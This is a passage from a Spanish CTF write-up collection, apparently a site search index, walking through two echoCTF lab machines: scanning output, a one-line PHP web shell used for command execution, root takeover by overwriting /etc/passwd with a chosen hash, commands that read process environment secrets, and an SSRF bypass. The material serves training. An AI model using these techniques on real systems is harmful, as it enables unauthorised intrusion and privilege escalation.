<code>memcached</code>.</li> <li><code>/var/lib/nginx/html/network-tools.php</code> x 3.</li> <li><code>/</code></li> <li>Extrayendo las variables de entorno de los procesos en ejecuci\u00f3n con <code>strings /proc/*/environ | grep ETSCTF</code>.</li> <li><code>/root</code>.</li> </ol>","tags":["Abusing memcache write item permission","Command Injection"]},{"location":"echoCTF/Boxes/3%20Intermedio/Alister/","title":"Alister","text":"<p>Write-up de la m\u00e1quina alister de echoCTF.</p> <p></p>","tags":["Writable /etc/passwd"]},{"location":"echoCTF/Boxes/3%20Intermedio/Alister/#indice","title":"\u00cdndice","text":"<ul> <li>Introducci\u00f3n</li> <li>Estad\u00edsticas</li> <li>Reconocimiento</li> <li>Escaneo de host<ul> <li>Escaneo completo de puertos</li> <li>Escaneo espec\u00edfico</li> </ul> </li> <li>Enumeraci\u00f3n</li> <li>Servicios<ul> <li>http - 1337</li> <li>http - 52444</li> </ul> </li> <li>Explotaci\u00f3n</li> <li>RCE Web Shell</li> <li>Post Explotaci\u00f3n</li> <li>Escalaci\u00f3n de privilegios</li> <li>Ubicaci\u00f3n de banderas</li> </ul>","tags":["Writable /etc/passwd"]},{"location":"echoCTF/Boxes/3%20Intermedio/Alister/#introduccion","title":"Introducci\u00f3n","text":"","tags":["Writable /etc/passwd"]},{"location":"echoCTF/Boxes/3%20Intermedio/Alister/#estadisticas","title":"Estad\u00edsticas","text":"Caracter\u00edstica Descripci\u00f3n Nombre alister Dificultad Intermediate Banderas 5 (other, 2: system, env, root) Puntos 5,300 Descripci\u00f3n/Pistas A combination of a listing application and bad configurations.  Are you A-listed? Well not to worry, this has nothing to do with that...","tags":["Writable /etc/passwd"]},{"location":"echoCTF/Boxes/3%20Intermedio/Alister/#reconocimiento","title":"Reconocimiento","text":"","tags":["Writable /etc/passwd"]},{"location":"echoCTF/Boxes/3%20Intermedio/Alister/#escaneo-de-host","title":"Escaneo de host","text":"","tags":["Writable /etc/passwd"]},{"location":"echoCTF/Boxes/3%20Intermedio/Alister/#escaneo-completo-de-puertos","title":"Escaneo completo de puertos","text":"<pre><code>\u2514\u2500$ sudo nmap -sS -p- -v -open -n -Pn -oG nmap/all_ports_ss $TARGET\nHost discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.\nStarting Nmap 7.93 ( https://nmap.org ) at 2023-08-31 21:27 EDT\nInitiating SYN Stealth Scan at 21:27\nScanning 10.0.160.56 [65535 ports]\nDiscovered open port 5244/tcp on 10.0.160.56\nDiscovered open port 1337/tcp on 10.0.160.56\nCompleted SYN Stealth Scan at 21:28, 46.99s elapsed (65535 total ports)\nNmap scan report for 10.0.160.56\nHost is up (0.15s latency).\nNot shown: 65465 closed tcp ports (reset), 68 filtered tcp ports (no-response)\nSome closed ports may be reported as filtered due to --defeat-rst-ratelimit\nPORT     STATE SERVICE\n1337/tcp open  waste\n5244/tcp open  unknown\n\nRead data files from: /usr/bin/../share/nmap\nNmap done: 1 IP address (1 host up) scanned in 47.06 seconds\n           Raw packets sent: 79748 (3.509MB) | Rcvd: 75357 (3.014MB)\n</code></pre>","tags":["Writable /etc/passwd"]},{"location":"echoCTF/Boxes/3%20Intermedio/Alister/#escaneo-especifico","title":"Escaneo espec\u00edfico","text":"<pre><code>\u2514\u2500$ nmap -sCV -p 1337,5244 -n -Pn -oN nmap/targeted $TARGET\nStarting Nmap 7.93 ( https://nmap.org ) at 2023-08-31 21:30 EDT\nNmap scan report for 10.0.160.56\nHost is up (0.14s latency).\n\nPORT     STATE SERVICE VERSION\n1337/tcp open  http    nginx 1.18.0\n|_http-title: Site doesn't have a title (text/html; charset=UTF-8).\n|_http-server-header: nginx/1.18.0\n5244/tcp open  unknown\n| fingerprint-strings:\n|   GenericLines:\n|     HTTP/1.1 400 Bad Request\n|     Content-Type: text/plain; charset=utf-8\n|     Connection: close\n|     Request\n|   GetRequest:\n|     HTTP/1.0 200 OK\n|     Content-Type: text/html\n|     Date: Fri, 01 Sep 2023 01:30:19 GMT\n|     &lt;!DOCTYPE html&gt;\n|     &lt;html lang=\"en\" translate=\"no\"&gt;\n|     &lt;head&gt;\n|     &lt;script src=\"https://polyfill.io/v3/polyfill.min.js?features=String.prototype.replaceAll\"&gt;&lt;/script&gt;\n|     &lt;meta charset=\"utf-8\" &gt;\n|     &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1\" &gt;\n|     &lt;meta name=\"referrer\" content=\"same-origin\" &gt;\n|     &lt;meta name=\"generator\" content=\"AList V3\" &gt;\n|     &lt;meta name=\"theme-color\" content=\"#000000\" &gt;\n|     &lt;meta name=\"google\" content=\"notranslate\" &gt;\n|     &lt;script src=\"https://g.alicdn.com/IMM/office-js/1.1.5/aliyun-web-office-sdk.min.js\"\n|     async\n|     &gt;&lt;/script&gt;\n|     &lt;link rel=\"shortcut icon\"\n|     type=\"image/ico\"\n|     href=\"https://cdn.jsdelivr.net/gh/alist-org/logo@main/logo.svg\"\n|     &lt;title&gt;AList&lt;/title&gt;\n|     &lt;script&gt;\n|     window.ALIST = {\n|     cdn: '',\n|     monaco_cdn: undefin\n|   HTTPOptions:\n|     HTTP/1.0 200 OK\n|     Content-Type: text/html\n|     Date: Fri, 01 Sep 2023 01:30:20 GMT\n|     &lt;!DOCTYPE html&gt;\n|     &lt;html lang=\"en\" translate=\"no\"&gt;\n|     &lt;head&gt;\n|     &lt;script src=\"https://polyfill.io/v3/polyfill.min.js?features=String.prototype.replaceAll\"&gt;&lt;/script&gt;\n|     &lt;meta charset=\"utf-8\" &gt;\n|     &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1\" &gt;\n|     &lt;meta name=\"referrer\" content=\"same-origin\" &gt;\n|     &lt;meta name=\"generator\" content=\"AList V3\" &gt;\n|     &lt;meta name=\"theme-color\" content=\"#000000\" &gt;\n|     &lt;meta name=\"google\" content=\"notranslate\" &gt;\n|     &lt;script src=\"https://g.alicdn.com/IMM/office-js/1.1.5/aliyun-web-office-sdk.min.js\"\n|     async\n|     &gt;&lt;/script&gt;\n|     &lt;link rel=\"shortcut icon\"\n|     type=\"image/ico\"\n|     href=\"https://cdn.jsdelivr.net/gh/alist-org/logo@main/logo.svg\"\n|     &lt;title&gt;AList&lt;/title&gt;\n|     &lt;script&gt;\n|     window.ALIST = {\n|     cdn: '',\n|_    monaco_cdn: undefin\n1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :\nSF-Port5244-TCP:V=7.93%I=7%D=8/31%Time=64F13EA4%P=x86_64-pc-linux-gnu%r(Ge\nSF:nericLines,67,\"HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-Type:\\x20t\nSF:ext/plain;\\x20charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n400\\x20Bad\\x\nSF:20Request\")%r(GetRequest,E9C,\"HTTP/1\\.0\\x20200\\x20OK\\r\\nContent-Type:\\x\nSF:20text/html\\r\\nDate:\\x20Fri,\\x2001\\x20Sep\\x202023\\x2001:30:19\\x20GMT\\r\\\nSF:n\\r\\n&lt;!DOCTYPE\\x20html&gt;\\n&lt;html\\x20lang=\\\"en\\\"\\x20translate=\\\"no\\\"&gt;\\n\\x2\nSF:0\\x20&lt;head&gt;\\n\\x20\\x20\\x20\\x20&lt;script\\x20src=\\\"https://polyfill\\.io/v3/p\nSF:olyfill\\.min\\.js\\?features=String\\.prototype\\.replaceAll\\\"&gt;&lt;/script&gt;\\n\\\nSF:x20\\x20\\x20\\x20&lt;meta\\x20charset=\\\"utf-8\\\"\\x20&gt;\\n\\x20\\x20\\x20\\x20&lt;meta\\x\nSF:20name=\\\"viewport\\\"\\x20content=\\\"width=device-width,\\x20initial-scale=1\nSF:\\\"\\x20&gt;\\n\\x20\\x20\\x20\\x20&lt;meta\\x20name=\\\"referrer\\\"\\x20content=\\\"same-o\nSF:rigin\\\"\\x20&gt;\\n\\x20\\x20\\x20\\x20&lt;meta\\x20name=\\\"generator\\\"\\x20content=\\\"\nSF:AList\\x20V3\\\"\\x20&gt;\\n\\x20\\x20\\x20\\x20&lt;meta\\x20name=\\\"theme-color\\\"\\x20co\nSF:ntent=\\\"#000000\\\"\\x20&gt;\\n\\x20\\x20\\x20\\x20&lt;meta\\x20name=\\\"google\\\"\\x20con\nSF:tent=\\\"notranslate\\\"\\x20&gt;\\n\\x20\\x20\\x20\\x20&lt;script\\x20\\x20\\x20\\x20\\x20\\\nSF:x20\\x20src=\\\"https://g\\.alicdn\\.com/IMM/office-js/1\\.1\\.5/aliyun-web-of\nSF:fice-sdk\\.min\\.js\\\"\\n\\x20\\x20\\x20\\x20\\x20\\x20async\\n\\x20\\x20\\x20\\x20&gt;&lt;/\nSF:script&gt;\\n\\x20\\x20\\x20\\x20&lt;link\\x20\\x20\\x20\\x20\\x20\\x20\\x20rel=\\\"shortcu\nSF:t\\x20icon\\\"\\n\\x20\\x20\\x20\\x20\\x20\\x20type=\\\"image/ico\\\"\\n\\x20\\x20\\x20\\x\nSF:20\\x20\\x20href=\\\"https://cdn\\.jsdelivr\\.net/gh/alist-org/logo@main/logo\nSF:\\.svg\\\"\\n\\x20\\x20\\x20\\x20&gt;\\n\\x20\\x20\\x20\\x20&lt;title&gt;AList&lt;/title&gt;\\n\\x20\\\nSF:x20\\x20\\x20&lt;script&gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20window\\.ALIST\\x20=\\x20{\\n\\\nSF:x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20cdn:\\x20'',\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x2\nSF:0\\x20monaco_cdn:\\x20undefin\")%r(HTTPOptions,E9C,\"HTTP/1\\.0\\x20200\\x20OK\nSF:\\r\\nContent-Type:\\x20text/html\\r\\nDate:\\x20Fri,\\x2001\\x20Sep\\x202023\\x2\nSF:001:30:20\\x20GMT\\r\\n\\r\\n&lt;!DOCTYPE\\x20html&gt;\\n&lt;html\\x20lang=\\\"en\\\"\\x20tra\nSF:nslate=\\\"no\\\"&gt;\\n\\x20\\x20&lt;head&gt;\\n\\x20\\x20\\x20\\x20&lt;script\\x20src=\\\"https:\nSF://polyfill\\.io/v3/polyfill\\.min\\.js\\?features=String\\.prototype\\.replac\nSF:eAll\\\"&gt;&lt;/script&gt;\\n\\x20\\x20\\x20\\x20&lt;meta\\x20charset=\\\"utf-8\\\"\\x20&gt;\\n\\x20\nSF:\\x20\\x20\\x20&lt;meta\\x20name=\\\"viewport\\\"\\x20content=\\\"width=device-width,\nSF:\\x20initial-scale=1\\\"\\x20&gt;\\n\\x20\\x20\\x20\\x20&lt;meta\\x20name=\\\"referrer\\\"\\\nSF:x20content=\\\"same-origin\\\"\\x20&gt;\\n\\x20\\x20\\x20\\x20&lt;meta\\x20name=\\\"genera\nSF:tor\\\"\\x20content=\\\"AList\\x20V3\\\"\\x20&gt;\\n\\x20\\x20\\x20\\x20&lt;meta\\x20name=\\\"\nSF:theme-color\\\"\\x20content=\\\"#000000\\\"\\x20&gt;\\n\\x20\\x20\\x20\\x20&lt;meta\\x20nam\nSF:e=\\\"google\\\"\\x20content=\\\"notranslate\\\"\\x20&gt;\\n\\x20\\x20\\x20\\x20&lt;script\\x\nSF:20\\x20\\x20\\x20\\x20\\x20\\x20src=\\\"https://g\\.alicdn\\.com/IMM/office-js/1\\\nSF:.1\\.5/aliyun-web-office-sdk\\.min\\.js\\\"\\n\\x20\\x20\\x20\\x20\\x20\\x20async\\n\nSF:\\x20\\x20\\x20\\x20&gt;&lt;/script&gt;\\n\\x20\\x20\\x20\\x20&lt;link\\x20\\x20\\x20\\x20\\x20\\x\nSF:20\\x20rel=\\\"shortcut\\x20icon\\\"\\n\\x20\\x20\\x20\\x20\\x20\\x20type=\\\"image/ic\nSF:o\\\"\\n\\x20\\x20\\x20\\x20\\x20\\x20href=\\\"https://cdn\\.jsdelivr\\.net/gh/alist\nSF:-org/logo@main/logo\\.svg\\\"\\n\\x20\\x20\\x20\\x20&gt;\\n\\x20\\x20\\x20\\x20&lt;title&gt;A\nSF:List&lt;/title&gt;\\n\\x20\\x20\\x20\\x20&lt;script&gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20window\\\nSF:.ALIST\\x20=\\x20{\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20cdn:\\x20'',\\n\\x20\\x20\nSF:\\x20\\x20\\x20\\x20\\x20\\x20monaco_cdn:\\x20undefin\");\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 96.71 seconds\n</code></pre>","tags":["Writable /etc/passwd"]},{"location":"echoCTF/Boxes/3%20Intermedio/Alister/#enumeracion","title":"Enumeraci\u00f3n","text":"","tags":["Writable /etc/passwd"]},{"location":"echoCTF/Boxes/3%20Intermedio/Alister/#servicios","title":"Servicios","text":"","tags":["Writable /etc/passwd"]},{"location":"echoCTF/Boxes/3%20Intermedio/Alister/#http-1337","title":"http - 1337","text":"<p>Dados los resultados de <code>nmap</code> se puede identificar que el puerto ofrece un servidor HTTP por lo que al navegar al sitio se pueden observar varias cosas. El sitio est\u00e1 interpretando PHP (deducido por como est\u00e1 devolviendo la informaci\u00f3n <code>Array(...)</code>) y se encuentra listando el contenido de un directorio.</p> <p></p> <p>Para obtener m\u00e1s informaci\u00f3n se ejecut\u00f3 la herramienta <code>ffuf</code> para buscar archivos o directorios disponibles, encontrando los siguientes:</p> <pre><code>\u2514\u2500$ ffuf -ic -c -u \"http://10.0.160.56:1337/FUZZ\" -w /usr/share/wordlists/dirb/common.txt\n\n        /'___\\  /'___\\           /'___\\\n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/\n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\\n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/\n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\\n          \\/_/    \\/_/   \\/___/    \\/_/\n\n       v2.0.0-dev\n________________________________________________\n\n :: Method           : GET\n :: URL              : http://10.0.160.56:1337/FUZZ\n :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 40\n :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500\n________________________________________________\n\n[Status: 200, Size: 161, Words: 49, Lines: 13, Duration: 141ms]\n    * FUZZ:\n\n[Status: 200, Size: 161, Words: 49, Lines: 13, Duration: 141ms]\n    * FUZZ: index.php\n\n[Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 140ms]\n    * FUZZ: public\n\n[Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 143ms]\n    * FUZZ: temp\n\n:: Progress: [4614/4614] :: Job [1/1] :: 284 req/sec :: Duration: [0:00:16] :: Errors: 0 ::\n</code></pre>","tags":["Writable /etc/passwd"]},{"location":"echoCTF/Boxes/3%20Intermedio/Alister/#http-52444","title":"http - 52444","text":"<p>Por otro lado, en el otro puerto disponible se encuentra la aplicaci\u00f3n AList que permite crear, modificar, eliminar archivos y directorios.</p> <p></p> <p>Se identific\u00f3 que la p\u00e1gina del puerto <code>1337</code> refleja el contenido de los archivos que se encuentren en la carpeta <code>public</code> de la aplicaci\u00f3n. Como ejemplo se cre\u00f3 un archivo de prueba.</p> <p></p>","tags":["Writable /etc/passwd"]},{"location":"echoCTF/Boxes/3%20Intermedio/Alister/#explotacion","title":"Explotaci\u00f3n","text":"","tags":["Writable /etc/passwd"]},{"location":"echoCTF/Boxes/3%20Intermedio/Alister/#rce-web-shell","title":"RCE Web Shell","text":"<p>Al identificar el directorio <code>public</code> en el puerto 1337 y ver que se estaban reflejando los archivos, se utiliz\u00f3 una web shell en php para poder lograr la ejecuci\u00f3n de c\u00f3digo:</p> evil.php<pre><code>&lt;?php system($_GET[\"cmd\"]);?&gt;\n</code></pre> <p></p> <p>Logrando as\u00ed ejecutar comandos en el servidor.</p> <p></p>","tags":["Writable /etc/passwd"]},{"location":"echoCTF/Boxes/3%20Intermedio/Alister/#post-explotacion","title":"Post Explotaci\u00f3n","text":"","tags":["Writable /etc/passwd"]},{"location":"echoCTF/Boxes/3%20Intermedio/Alister/#escalacion-de-privilegios","title":"Escalaci\u00f3n de privilegios","text":"<p>Despu\u00e9s de obtener una reverse shell se identific\u00f3 que los archivos creados por la aplicaci\u00f3n Alist, son creados por el usuario <code>root</code> por lo que hace que dicha aplicaci\u00f3n se encuentre ejecut\u00e1ndose con privilegios altos.</p> <p></p> <p>Adem\u00e1s, se identific\u00f3 un archivo usado como base de datos de la aplicaci\u00f3n, al ejecutar el comando <code>strings data.db</code> se pudo visualizar su contenido.</p> <p></p> <p>Encontrando un token de la aplicaci\u00f3n v\u00e1lido para autenticarse como administrador de la aplicaci\u00f3n web. Se verific\u00f3 la autenticidad dado que al refrescar la p\u00e1gina principal se cambi\u00f3 el mensaje inferior de <code>Login</code> a <code>Manage</code>.</p> <p></p> <p>Dentro de la ruta de gesti\u00f3n es posible dar de alta un nuevo lugar de almacenamiento.</p> <p></p> <p>Espec\u00edficando la ruta local del sistema, pudiendo indicar que fuese <code>/etc</code>.</p> <p></p> <p>Dado que la aplicaci\u00f3n cuenta con permisos de <code>root</code> se podr\u00eda, eventualmente, descargar y modificar el archivo <code>passwd</code> a\u00f1adiendo un hash en el campo del usuario <code>root</code> y nuevamente subiendo el archivo modificado.</p> <pre><code>\u2514\u2500$ catn passwd\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\n[...]\n\n\u2514\u2500$ openssl passwd -1 -salt srrequiem srrequiem\n$1$srrequie$ynKr1xfKTHO0yDUd7aWxq/\n\n\u2514\u2500$ nano passwd\n\n\u2514\u2500$ catn passwd\nroot:$1$srrequie$ynKr1xfKTHO0yDUd7aWxq/:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\n[...]\n</code></pre> <p></p> <p>Para posteriormente autenticarse como usuario <code>root</code> con la contrase\u00f1a asignada.</p> <p></p>","tags":["Writable /etc/passwd"]},{"location":"echoCTF/Boxes/3%20Intermedio/Alister/#ubicacion-de-banderas","title":"Ubicaci\u00f3n de banderas","text":"<ol> <li>(other: 100 pts) <code>/var/www/html/public/ETSCTF.html</code>.</li> <li>(system: 1300 pts) <code>/etc/passwd</code>.</li> <li>(system: 1300 pts) <code>/etc/shadow</code>.</li> <li>(env: 900 pts) <code>strings /proc/1/environ | grep ETSCTF_</code>.</li> <li>(root: 1500 pts) <code>/root</code>.</li> </ol>","tags":["Writable /etc/passwd"]},{"location":"echoCTF/Boxes/5%20Experto/Gogo%20Yubari/","title":"Gogo Yubari","text":"<p>Write-up de la m\u00e1quina gogo-yubari de echoCTF.</p> <p></p>","tags":["Server Side Request Forgery (SSRF)","SQL Injection"]},{"location":"echoCTF/Boxes/5%20Experto/Gogo%20Yubari/#indice","title":"\u00cdndice","text":"<ul> <li>Introducci\u00f3n</li> <li>Estad\u00edsticas</li> <li>Reconocimiento</li> <li>Escaneo de host<ul> <li>Escaneo completo de puertos</li> <li>Escaneo espec\u00edfico</li> </ul> </li> <li>Enumeraci\u00f3n</li> <li>Servicios<ul> <li>http - 8080</li> </ul> </li> <li>Explotaci\u00f3n</li> <li>SSRF</li> <li>SQLi</li> <li>Post Explotaci\u00f3n</li> <li>Escalaci\u00f3n de privilegios<ul> <li>mysql \u2192 root</li> </ul> </li> <li>Ubicaci\u00f3n de banderas</li> <li>Notas adicionales</li> <li>Eventos <code>mysql</code></li> <li>Referencias</li> </ul>","tags":["Server Side Request Forgery (SSRF)","SQL Injection"]},{"location":"echoCTF/Boxes/5%20Experto/Gogo%20Yubari/#introduccion","title":"Introducci\u00f3n","text":"","tags":["Server Side Request Forgery (SSRF)","SQL Injection"]},{"location":"echoCTF/Boxes/5%20Experto/Gogo%20Yubari/#estadisticas","title":"Estad\u00edsticas","text":"Caracter\u00edstica Descripci\u00f3n Nombre gogo-yubari Dificultad Expert Banderas 11 (7: other, 2: system, env, root) Puntos 6,600: (other: 1,600, system: 2,600, env: 900, root: 1,500) Descripci\u00f3n/Pistas Gogo Yubari the web scrapper, named after the famous assassin, scraps echocity-f.com for validation of usability rules by producing a screenshot of the site.","tags":["Server Side Request Forgery (SSRF)","SQL Injection"]},{"location":"echoCTF/Boxes/5%20Experto/Gogo%20Yubari/#reconocimiento","title":"Reconocimiento","text":"","tags":["Server Side Request Forgery (SSRF)","SQL Injection"]},{"location":"echoCTF/Boxes/5%20Experto/Gogo%20Yubari/#escaneo-de-host","title":"Escaneo de host","text":"","tags":["Server Side Request Forgery (SSRF)","SQL Injection"]},{"location":"echoCTF/Boxes/5%20Experto/Gogo%20Yubari/#escaneo-completo-de-puertos","title":"Escaneo completo de puertos","text":"<pre><code>\u2514\u2500$ sudo nmap -sS --min-rate 5000 -v -p- -open -n -Pn -oG nmap/all_ports_ss $TARGET\nHost discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.\nStarting Nmap 7.92 ( https://nmap.org ) at 2023-01-25 23:17 EST\nInitiating SYN Stealth Scan at 23:17\nScanning 10.0.200.69 [65535 ports]\nDiscovered open port 8080/tcp on 10.0.200.69\nCompleted SYN Stealth Scan at 23:17, 17.74s elapsed (65535 total ports)\nNmap scan report for 10.0.200.69\nHost is up (0.15s latency).\nNot shown: 61724 closed tcp ports (reset), 3810 filtered tcp ports (no-response)\nSome closed ports may be reported as filtered due to --defeat-rst-ratelimit\nPORT     STATE SERVICE\n8080/tcp open  http-proxy\n\nRead data files from: /usr/bin/../share/nmap\nNmap done: 1 IP address (1 host up) scanned in 17.82 seconds\n           Raw packets sent: 87925 (3.869MB) | Rcvd: 66137 (2.645MB)\n</code></pre>","tags":["Server Side Request Forgery (SSRF)","SQL Injection"]},{"location":"echoCTF/Boxes/5%20Experto/Gogo%20Yubari/#escaneo-especifico","title":"Escaneo espec\u00edfico","text":"<pre><code>\u2514\u2500$ nmap -sCV -p 8080 -oN nmap/targeted $TARGET\nStarting Nmap 7.92 ( https://nmap.org ) at 2023-01-25 23:21 EST\nNmap scan report for 10.0.200.69\nHost is up (0.15s latency).\n\nPORT     STATE SERVICE    VERSION\n8080/tcp open  http-proxy GoGo go v1.11.12\n| fingerprint-strings:\n|   GetRequest:\n|     HTTP/1.0 200 OK\n|     Server: GoGo go v1.11.12\n|     Date: Thu, 26 Jan 2023 04:21:46 GMT\n|     Content-Type: text/html; charset=utf-8\n|     &lt;!DOCTYPE html&gt;\n|     &lt;html&gt;\n|     &lt;head&gt;\n|     &lt;title&gt;Gogo Yubari URL Cralwer&lt;/title&gt;\n|     &lt;style&gt;\n|     main {\n|     font-family: monospace, monospace;\n|     max-width: 38rem;\n|     padding: 2rem;\n|     margin: auto;\n|     @media only screen and (max-device-width: 736px) {\n|     main {\n|     padding: 0rem;\n|     ::selection {\n|     background: #d3869b;\n|     body {\n|     background: #282828;\n|     color: #ebdbb2;\n|     background-color: #3c3836;\n|     padding: 1em;\n|     border: 0;\n|     a:active, a:visited {\n|     color: #b16286;\n|_    background-color: #1d2021;\n|_http-title: Gogo Yubari URL Cralwer\n|_http-server-header: GoGo go v1.11.12\n1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :\nSF-Port8080-TCP:V=7.92%I=7%D=1/25%Time=63D1FFDA%P=x86_64-pc-linux-gnu%r(Ge\nSF:tRequest,B67,\"HTTP/1\\.0\\x20200\\x20OK\\r\\nServer:\\x20GoGo\\x20go\\x20v1\\.11\nSF:\\.12\\r\\nDate:\\x20Thu,\\x2026\\x20Jan\\x202023\\x2004:21:46\\x20GMT\\r\\nConten\nSF:t-Type:\\x20text/html;\\x20charset=utf-8\\r\\n\\r\\n&lt;!DOCTYPE\\x20html&gt;\\n&lt;html\nSF:&gt;\\n\\x20\\x20\\x20\\x20&lt;head&gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20&lt;title&gt;Gogo\\\nSF:x20Yubari\\x20URL\\x20Cralwer&lt;/title&gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20&lt;s\nSF:tyle&gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20main\\x20{\\n\\x20\\x20\\x20\\\nSF:x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20font-family:\\x20monospace,\\x20monosp\nSF:ace;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20max-width:\\x2038r\nSF:em;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20padding:\\x202rem;\\\nSF:n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20margin:\\x20auto;\\n\\x20\nSF:\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20}\\n\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x\nSF:20\\x20\\x20@media\\x20only\\x20screen\\x20and\\x20\\(max-device-width:\\x20736\nSF:px\\)\\x20{\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20main\\x20{\\n\\\nSF:x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20padding:\\x200rem\nSF:;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20}\\n\\x20\\x20\\x20\\x20\\\nSF:x20\\x20\\x20\\x20\\x20\\x20}\\n\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20::s\nSF:election\\x20{\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20backgrou\nSF:nd:\\x20#d3869b;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20}\\n\\n\\x20\\x20\\\nSF:x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20body\\x20{\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\\nSF:x20\\x20\\x20\\x20\\x20background:\\x20#282828;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x2\nSF:0\\x20\\x20\\x20\\x20\\x20color:\\x20\\x20\\x20\\x20\\x20\\x20#ebdbb2;\\n\\x20\\x20\\x\nSF:20\\x20\\x20\\x20\\x20\\x20\\x20\\x20}\\n\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\nSF:\\x20pre\\x20{\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20backgroun\nSF:d-color:\\x20#3c3836;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20p\nSF:adding:\\x201em;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20border\nSF::\\x200;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20}\\n\\n\\x20\\x20\\x20\\x20\\\nSF:x20\\x20\\x20\\x20\\x20\\x20a,\\x20a:active,\\x20a:visited\\x20{\\n\\x20\\x20\\x20\\\nSF:x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20color:\\x20#b16286;\\n\\x20\\x20\\x20\\x20\nSF:\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20background-color:\\x20#1d2021;\\n\");\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 105.59 seconds\n</code></pre>","tags":["Server Side Request Forgery (SSRF)","SQL Injection"]},{"location":"echoCTF/Boxes/5%20Experto/Gogo%20Yubari/#enumeracion","title":"Enumeraci\u00f3n","text":"","tags":["Server Side Request Forgery (SSRF)","SQL Injection"]},{"location":"echoCTF/Boxes/5%20Experto/Gogo%20Yubari/#servicios","title":"Servicios","text":"","tags":["Server Side Request Forgery (SSRF)","SQL Injection"]},{"location":"echoCTF/Boxes/5%20Experto/Gogo%20Yubari/#http-8080","title":"http - 8080","text":"<p>En la p\u00e1gina principal se presenta una utilidad para realizar web-scrapping mediante una URL la cu\u00e1l se permite proporcionar.</p> <p></p> <p>A trav\u00e9s del c\u00f3digo fuente se expone un hostname interno (consola de administrador).</p> <p></p> <p>Despu\u00e9s de enviar un formulario con la URL que puede ser enviada, se puede identificar que s\u00f3lo acepta peticiones que puedan ser identificadas como internas dado que se genera una imagen en <code>/public/&lt;ip&gt;.png</code> en caso de que sea procesada correctamente, en caso contrario, la ruta de la imagen ser\u00e1 <code>/fullscreenshot.png</code>.</p>","tags":["Server Side Request Forgery (SSRF)","SQL Injection"]},{"location":"echoCTF/Boxes/5%20Experto/Gogo%20Yubari/#explotacion","title":"Explotaci\u00f3n","text":"","tags":["Server Side Request Forgery (SSRF)","SQL Injection"]},{"location":"echoCTF/Boxes/5%20Experto/Gogo%20Yubari/#ssrf","title":"SSRF","text":"<p>Despu\u00e9s de probar con numerosos payloads modificando valores de cabeceras de la petici\u00f3n (<code>Host</code>, <code>X-Forwarder-For</code>, etc.) se identific\u00f3 que se logra hacer un bypass interno al sitio usando <code>https</code> en vez de <code>http</code> en la URL prove\u00edda. Por lo que al usar <code>https://localhost.echocity-f.com/</code> se genera una imagen correctamente con su respuesta.</p> <p></p> <p>Tanto con esa respuesta como al enviar nuevas rutas de prueba, se puede identificar que se est\u00e1 a\u00f1adiendo 